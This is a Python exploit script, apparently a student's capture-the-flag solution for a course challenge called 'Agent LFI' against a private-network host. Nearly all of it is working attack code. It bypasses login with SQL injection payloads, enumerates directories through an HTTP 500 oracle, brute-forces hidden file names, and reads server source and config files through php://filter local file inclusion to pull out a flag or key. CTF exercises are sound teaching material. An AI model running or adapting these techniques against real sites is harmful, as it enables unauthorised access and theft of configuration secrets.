import argparse
import json
import os
import re
import sys
import base64
import requests
import urllib3
from datetime import datetime, timezone

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET     = "https://10.9.96.228:9070"
MY_EMAIL   = "CS25MTECH14003@iith.ac.in"
MAX_DIRS   = 120


def timestamp():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def save(path, content, binary=False):
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    with open(path, "wb" if binary else "w", encoding=None if binary else "utf-8") as fh:
        fh.write(content)


def try_login(session, base, email, verify):
    injections = [
        f"' OR email='{email}' -- -",
        f"' OR email='{email}' #",
        "' OR '1'='1' -- -",
    ]

    for inj in injections:
        print(f"  [>] Payload: {inj[:55]}...")
        resp = session.post(
            f"{base}/",
            data={"login": "1", "login_email": email, "login_pass": inj},
            verify=verify,
            timeout=20,
        )
        if "profile" in resp.text.lower() or "My Profile" in resp.text:
            print(f"  [+] Logged in! (HTTP {resp.status_code})")
            return True, resp.text
        print(f"  [-] No luck (HTTP {resp.status_code})")

    return False, resp.text


def scan_dirs(session, base, verify, max_d):
    hits = []
    print(f"\n[*] Scanning user directories (0 to {max_d})...")
    for i in range(max_d + 1):
        try:
            r = session.get(
                f"{base}/",
                params={"p": "download", "dir": str(i), "file": "avatar1.png"},
                verify=verify,
                timeout=8,
            )
            if r.status_code == 500:
                hits.append(i)
                sys.stdout.write(f" [{i}]")
            else:
                sys.stdout.write(".")
            sys.stdout.flush()
        except Exception:
            sys.stdout.write("!")
            sys.stdout.flush()

    print(f"\n[+] Active dirs: {hits}")
    return hits


def hunt_file(session, base, verify, dirs):
    targets = [
        "gRaB.php", "grab.php", "flag.php", "flag.txt",
        "secret.php", "hidden.php", "wallet.php",
        ".wallet", ".hidden_wallet", ".secret_wallet",
        "config.php", "secret.txt", "README.md",
    ]

    print(f"\n[*] Hunting for hidden files across {len(dirs)} directories...")
    for d in dirs:
        for fname in targets:
            try:
                r = session.get(
                    f"{base}/",
                    params={"p": "download", "dir": str(d), "file": fname},
                    verify=verify,
                    timeout=8,
                )
                if r.status_code == 500:
                    print(f"  [+] Found: dir={d}, file={fname}")
                    return d, fname
            except Exception:
                pass
    return None


def fetch_direct(session, base, verify, found, out_dir):
    paths = []
    if found:
        d, fname = found
        paths += [
            f"/INC/UPLOAD/THUMBS/{d}/{fname}",
            f"/INC/UPLOAD/{d}/{fname}",
        ]
    paths += ["/INC/gRaB.php", "/gRaB.php", "/grab.php"]

    flag_patterns = [
        r"(cs6903\{[^}\n]+\})",
        r"\$key\s*=\s*['\"]?([a-fA-F0-9]{32})['\"]?\s*;",
    ]

    for path in paths:
        url = f"{base}{path}"
        print(f"[*] Fetching: {url}")
        try:
            r = session.get(url, verify=verify, timeout=10)
            body = r.text
            safe_name = path.replace("/", "_")
            save(os.path.join(out_dir, f"direct{safe_name}.txt"), body)
            print(f"    HTTP {r.status_code} | len={len(body)}")
            if body.strip():
                print(f"    Preview: {body.strip()[:250]}")

            for pat in flag_patterns:
                m = re.search(pat, body)
                if m:
                    raw = m.group(1)
                    flag = raw if raw.startswith("cs6903") else f"cs6903{{{raw.lower()}}}"
                    print(f"\n[+] FLAG: {flag}")
                    return flag
        except Exception as e:
            print(f"    Error: {e}")

    return None


def lfi_filter(session, base, verify, found, out_dir):
    candidates = [
        "INC/gRaB.php", "gRaB.php", "grab.php",
        ".wallet", ".secret_wallet", ".hidden_wallet",
        "INC/DB/config.php", "config.php",
        "flag.txt", "flag.php", "index.php",
    ]
    if found:
        d, fname = found
        candidates.insert(0, f"INC/UPLOAD/THUMBS/{d}/{fname}")

    params_to_try = ["p", "gRaB", "grab", "file"]

    print("\n[*] Trying php://filter LFI...")
    for res in candidates:
        wrapper = f"php://filter/convert.base64-encode/resource={res}"
        for param in params_to_try:
            try:
                r = session.get(f"{base}/", params={param: wrapper}, verify=verify, timeout=10)
                chunks = re.findall(r"[A-Za-z0-9+/=]{80,}", r.text)
                if not chunks:
                    continue

                decoded = base64.b64decode(chunks[0]).decode(errors="replace")
                print(f"\n  [+] Hit! param={param}, resource={res}")
                print(f"      Decoded:\n{decoded[:1200]}")
                safe = res.replace("/", "_")
                save(os.path.join(out_dir, f"lfi_filter_{safe}.txt"), decoded)

                m_flag = re.search(r"(cs6903\{[^}\n]+\})", decoded)
                m_key  = re.search(r"\$key\s*=\s*['\"]?([a-fA-F0-9]{32})['\"]?\s*;", decoded)
                if m_flag:
                    return m_flag.group(1)
                elif m_key:
                    return f"cs6903{{{m_key.group(1).lower()}}}"
            except Exception:
                pass

    return None


def main():
    ap = argparse.ArgumentParser(description="Agent LFI — CS25MTECH14003")
    ap.add_argument("--base-url",  default=TARGET)
    ap.add_argument("--username",  default=MY_EMAIL)
    ap.add_argument("--max-dir",   type=int, default=MAX_DIRS)
    ap.add_argument("--insecure",  action="store_true", default=True)
    args = ap.parse_args()

    verify  = not args.insecure
    base    = args.base_url.rstrip("/")
    out_dir = os.path.abspath(f"lfi_run_{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')}")
    os.makedirs(out_dir, exist_ok=True)

    log = {
        "challenge":  "Agent LFI",
        "student":    "Atish Kadam",
        "run_at":     timestamp(),
        "target":     base,
        "steps":      [],
        "flag":       None,
        "errors":     [],
    }

    session = requests.Session()
    session.verify = verify

    print("\n[1] Attempting login via SQLi...")
    ok, html = try_login(session, base, args.username, verify)
    if ok:
        save(os.path.join(out_dir, "login_success.html"), html)
        log["steps"].append("login_ok")
    else:
        save(os.path.join(out_dir, "login_fail.html"), html)
        log["errors"].append("login failed")
        print("[!] Login failed — continuing with LFI anyway...")

    print("\n[2] Directory oracle scan...")
    active_dirs = scan_dirs(session, base, verify, args.max_dir)
    log["steps"].append({"dirs_found": active_dirs})

    print("\n[3] Hunting hidden file...")
    found = hunt_file(session, base, verify, active_dirs)
    if found:
        log["steps"].append({"hidden_file": found})

    print("\n[4] Direct path fetch...")
    flag = fetch_direct(session, base, verify, found, out_dir)

    if not flag:
        print("\n[5] PHP filter fallback...")
        flag = lfi_filter(session, base, verify, found, out_dir)

    log["flag"] = flag
    save(os.path.join(out_dir, "run_log.json"), json.dumps(log, indent=2))

    print("\n" + "=" * 55)
    if flag:
        print(f"[+] Flag: {flag}")
        print("[!] Please verify before submitting.")
    else:
        print("[!] Flag not found automatically.")
        print(f"[*] Check files in: {out_dir}")
    return 0 if flag else 1


if __name__ == "__main__":
    sys.exit(main())